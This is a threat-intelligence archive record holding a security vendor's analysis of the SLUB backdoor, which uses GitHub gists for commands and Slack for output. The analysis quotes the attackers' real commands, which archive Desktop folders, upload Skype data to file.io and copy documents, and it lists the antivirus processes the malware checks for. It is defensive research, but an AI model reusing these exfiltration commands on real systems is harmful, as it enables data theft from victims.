{
    "id": "d26d0c78-acec-457a-94e8-2b4e71b47e99",
    "created_at": "2022-10-25T16:48:22.381853Z",
    "updated_at": "2025-03-27T02:08:41.464197Z",
    "deleted_at": null,
    "sha1_hash": "d5fb10e16b4f2346fe2fcbeac9f8f2beccc914e3",
    "title": "New SLUB Backdoor Uses GitHub, Communicates via Slack",
    "authors": "",
    "file_creation_date": "2019-03-13T08:35:43Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 533848,
    "plain_text": "# New SLUB Backdoor Uses GitHub, Communicates via Slack\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/new-slub-backdoor-uses-github-communicates-via-slack](https://blog.trendmicro.com/trendlabs-security-intelligence/new-slub-backdoor-uses-github-communicates-via-slack/)**\n\nTrend Micro Cyber Safety Solutions Team March 7, 2019\n\n**_by Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and_**\n**_Joseph C. Chen_**\n\nWe recently came across a previously unknown\nmalware that piqued our interest in multiple ways.\nFor starters, we discovered it being spread via\n[watering hole attacks, a technique that involves an](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101)\nattacker compromising a website before adding code\nto it so visitors are redirected to the infecting code. In\nthis case, each visitor is redirected only once. The\n[infection was done by exploiting CVE-2018-8174, a](https://nvd.nist.gov/vuln/detail/CVE-2018-8174)\n[VBScript engine vulnerability that was patched by Microsoft back in May 2018.](https://blog.trendmicro.com/trendlabs-security-intelligence/microsoft-patch-tuesday-for-may-includes-updates-for-actively-exploited-vulnerabilities-2/)\n\nSecond, it uses a multi-stage infection scheme. After it exploits the vulnerability, it\ndownloads a DLL and runs it in PowerShell (PS). This file, which is a downloader, then\ndownloads and runs the second executable file containing a backdoor. The first stage\ndownloader also checks for the existence of different kinds of antivirus software\nprocesses, and then proceeds to exit if any is found. At the time of discovery, the\nbackdoor was seemingly unknown to AV products.\n\nIn addition to the previously mentioned facts, we quickly noticed that the malware\nwas connecting to the Slack platform, a collaborative messaging system that lets\nusers create and use their own workspaces through the use of channels, similar to\nthe IRC chatting system. We found this quite interesting, since we haven’t observed\nany malware to date that communicates using Slack– although we’ve previously\ndiscussed how cybercriminals could possibly abuse chat platforms as part of their\nattack.\n\nOur technical investigation and analysis of the attacker’s tools, techniques, and\nprocedures (TTP) lead us to think that this threat is actually a stealthy targeted attack\nrun by capable actors, and not a typical cybercriminal scheme.\n\nNote that as soon as this malware was discovered, we informed the Canadian Centre\nfor Cyber Security, which acts as Canada’s National Computer Security Incident\nResponse Team (CSIRT). The Cyber Centre alerted the site operator, helped them\nunderstand the malware that was found, and offered mitigation advice.\n\n**_Infection Chain_**\n\n\n-----\n\n_Figure 1. The infection chain of the attack_\n\n**_The downloader_**\n\nThe downloader, which runs through PowerShell as a DLL, serves several purposes.\nThe first is to download the second stage malware, which we called the SLUB (for\nSLack and githUB; detected as Backdoor.Win32.SLUB.A) backdoor and execute it.\nThe second purpose is to check if the following antivirus processes are running:\n\nV3Tray.exe\nAYAgent.aye\nnavapsvc.exe\nashServ.exe\navgemc.exe\nbdagent.exe\nZhuDongFangYu.exe\n\nIf the downloader finds one of these, it simply exits.\n\nFinally, the downloader also exploits the CVE-2015-1701 vulnerability to acquire Local\nPrivilege Escalation. The exploit’s code was likely created by modifying code from a\n[GitHub repository, which is shown in the image below.](https://github.com/hfiref0x/CVE-2015-1701/blob/master/Source/Taihou/main.c)\n\n_Figure 2. The unmodified code_\n\n**_The SLUB backdoor_**\n\n\n-----\n\nstatically linking curl library to perform multiple HTTP requests. Other statically-linked\nlibraries are boost (for extracting commands from gist snippets) and JsonCpp (for\nparsing slack channel communication).\n\nThe malware also embeds two authorization tokens to communicate with the Slack\nAPI.\n\nIt copies itself to ProgramData\\update\\ and creates persistence via a Run\nregistry key, calling export function UpdateMPUnits with rundll32.exe. Note the\ntypo in the ValueName, “Microsoft Setup Initializazion.”\n\n_Figure 3. Screenshots of the Run registry key_\n\nIt downloads a specific “gist” snippet from Github and parses it, looking for\ncommands (which we will cover further in this entry) to execute. Only lines\nstarting with “^” and ending with “$” will be executed. The other lines are\nignored.\n\n_Figure 4. The “gist” snippet that is downloaded from Github_\n\nThe result of the commands is then posted to a private Slack channel in a particular\nworkspace using the embedded tokens.\n\nNote that a side effect of this particular setup is that the attacker has no way to issue\ncommands to a specific target. Each infected computer will execute the commands\nthat are enabled in the gist snippet upon checking it.\n\n\n-----\n\n_Figure 5. Scheme of the backdoor communication, with the first arrow starting from the_\n\n_person who initiates the connection_\n\n**_Backdoor features_**\n\nThe backdoor supports the following commands and subcommands (most of them\nare self-explanatory). Commands and subcommands / parameters are separated with\na comma “,”, as seen in figure 4.\n\n\n**Command**\n**Line**\n\n\n**Details**\n\n\n_exec_ Execute command with cmd.exe\n\n_dnexec_ Download and execute command\n\n_update_ Download a file, remove the current one and run the downloaded file\n\n_destroy_ Delete malware from disk with a batch script\n\n_capture_ Take screenshot and send it to slack channel\n\n**file**\n\n_list_ List specified file\n\n_copy_ Copy specified file\n\n_delete_ Delete specified file\n\n_upload_ Upload local file to file.io website and post the download link to the Slack channel\n\n**dir**\n\n\n-----\n\n_remove_ Remove directory\n\n**proc**\n\n_list_ List processes\n\n_kill_ Terminate process\n\n**drive**\n\n_list_ Get information about each volume of the current drive, such as free space,\nextended attributes, USN journal activation, and encryption state\n\n**reg**\n\n_Query_ Query registry key\n\n_Read_ Read registry key\n\n_Write_ Write registry key\n\n_tmout_ Call to “sleep” function\n\n**_Slack communication function_**\n\nThe slack communication function contains two hardcoded authentication tokens\nsplit into a few smaller chunks.\n\n_Figure 6. Code of the communication_\n\n_function_\n\nLater, the backdoor gets the username\nand computer name (seen in Figure 7)\nthen creates and uploads the Slack\nmessage into a channel. It uses the\nfollowing API to post messages:\n\nhttps://api.slack.com/methods/chat.postMessage\n\n\n-----\n\n_computer name_\n\nThe keywords “title,” “text,” “channel,”\nand “attachments” are clearly visible in\nthe function listing.\n\n_Figure 8. Function listing showing keywords_\n\nThe output of every command is sent to a private Slack channel, while every\ncommand itself is sent to a different private Slack channel as an attachment with the\ntext “*computername:username*”.\n\n**_The attacker’s tools, techniques and procedures_**\n\nThe Github account and the Slack workspace were created specifically for a campaign\non February 19 and 20, while we estimate that the attacker compiled the malware on\nFebruary 22.\n\nThe attacker added the first commands to Github on February 20. However looking at\nthe Slack channels, we can see that the attacker tested the malware on February 23\nand 24. The first victims were seen on February 27.\n\nThe attackers’ first actions involve getting context information to learn more about\nthe computer they infected:\n\n^exec,tasklist$\n\n^capture$\n\n^drive,list$\n\n^file,list,C:\\Users\\$\n\n^reg,read,HKEY_CURRENT_USER,SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run$\n\nThey look for running processes, take screen captures, list drives on the machine, list\nall users, and check the malware’s persistence registry key.\n\nThey will also usually list some known directories:\n\n\n-----\n\n^exec,dir /s C:\\Users\\USER\\Downloads\\$\\\n\n^exec,dir /s C:\\Users\\USER\\Recent\\$\n\nSome commands caught our interest, such as one that allows the attacker to create\nan archive file of the user’s entire Desktop folder, which is then exfiltrated:\n\n^exec,powershell -Command compress-archive -path C:\\Users\\USER\\Desktop destinationpath C:\\Users\\USER\\doc1$\\\n\n^file,upload,C:\\Users\\USER\\doc1$\n\nThe following command allows an attacker to build a CAB file containing the file tree\nof the user’s Desktop:\n\n^exec,cd C:\\Users\\USER & dir /s /b /a-d C:\\Users\\USER\\Desktop > C:\\Users\\USER\\win12\n& makecab /d CabinetName1=win34 /f C:\\Users\\USER\\win12$\n\nThe attacker is also seemingly interested in files containing the local archive in Skype:\n\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage-ecs.data$\n\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data$\n\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data-shm$\n\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data-wal$\n\nThe attacker copies all the HWP files (extension used by a Korean word processor) to\na specific directory.\n\n^exec,copy C:\\Users\\USER\\Desktop\\*.hwp C:\\Users\\USER\\oo$\n\nThe attacker likely planned to exfiltrate this directory — however, we did not see any\ncommands for this.\n\nWe also noted a specific interest in a software called “Neologic Plus Board,” which\nseems to be used for the administration of bulletin board systems. Some of the files\nthat the attackers retrieved contained hundreds of BBS URLs. We also noticed that\nmost of the files uploaded to file.io were already deleted when we tried to retrieve\nthem.\n\nBased on the commands run by the attackers, we theorize that they are looking for\npeople-related information. The attackers want to know more about the targeted\nvictims’ communications. Thus, they dig into activities on Twitter, Skype, KakaoTalk,\nBBS — and possibly more communication systems — in addition to collecting the\nHWP files.\n\nThis timeline of events shows the speed in which the threat actors launched the\nattack:\n\n\n-----\n\n_Figure 9. Timeline of events_\n\n**_Conclusion_**\n\nPerhaps the most unique aspect of this campaign is that it makes use of three\ndifferent online services to issue commands, get the results, and retrieve files from\ncompromised hosts.\n\nOur investigation makes us believe with strong confidence that it was part of a\npossible targeted attack campaign. So far, we have not been able to find related\nattacks, and have not spotted the custom backdoor elsewhere. We have been\nsearching for similar samples and have found none so far, which is a strong\nindication that the attackers either developed the malware or got it from a private\ndeveloper who has not publicly leaked it.\n\nThe commands that the attackers ran clearly show a strong interest in person-related\ninformation, with a special focus on communication software, in an attempt to learn\nmore about the people behind the computers they infected.\n\nThe attackers also appear to be professionals, based on their way of handling their\nattack. They only use public third party services, and therefore did not need to register\nany domains or anything else that could leave a trail. The few email addresses we\nfound during the investigation were also using trash email systems, giving the\nattackers a clean footprint. Finally, the watering hole chosen by the attackers can be\nconsidered interesting for those who follow political activities, which might give a\nglimpse into the nature of the groups and individuals that the attackers are targeting.\n\nWe would like to thank Github’s SIRT and Slack’s security teams for quickly removing\nthe related files, which effectively cut the communication between the attackers and\ntheir malware.\n\nIn response to this incident, Slack replied with the following:\n\n_As noted in their post, Trend Micro recently discovered a third party’s unauthorized access_\n_of another third party’s computer using malware, and reported to us the existence of a_\n_Workspace on Slack related to this effort. We investigated and immediately shut down the_\n\n\n-----\n\n_misuse of our platform and we will take action against anyone who violates our terms of_\n_service._\n\n**_Indicators of Compromise (IoCs):_**\n\n3ba00114d0ae766cf77edcdcc953ec6ee7527181968c02d4ffc36b9f89c4ebc7\n(Trojan.Win32.CVE20151701.E)\n43221eb160733ea694b4fdda70e7eab4a86d59c5f9749fd2f9b71783e5da6dd7\n(Backdoor.Win32.SLUB.A)\n\n**_URLs:_**\n\nhxxps://gist.github[.]com/kancc14522/626a3a68a2cc2a91c1ece1eed7610c8a\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.03.07.SLUB_Backdoor/New%20SLUB%20Backdoor%20Uses%20GitHub%20Communicates%20via%20Slack.pdf"
    ],
    "report_names": [
        "New SLUB Backdoor Uses GitHub Communicates via Slack"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041321,
    "ts_creation_date": 1552466143,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/d5fb10e16b4f2346fe2fcbeac9f8f2beccc914e3.pdf",
        "text": "https://archive.orkl.eu/d5fb10e16b4f2346fe2fcbeac9f8f2beccc914e3.txt",
        "img": "https://archive.orkl.eu/d5fb10e16b4f2346fe2fcbeac9f8f2beccc914e3.jpg"
    }
}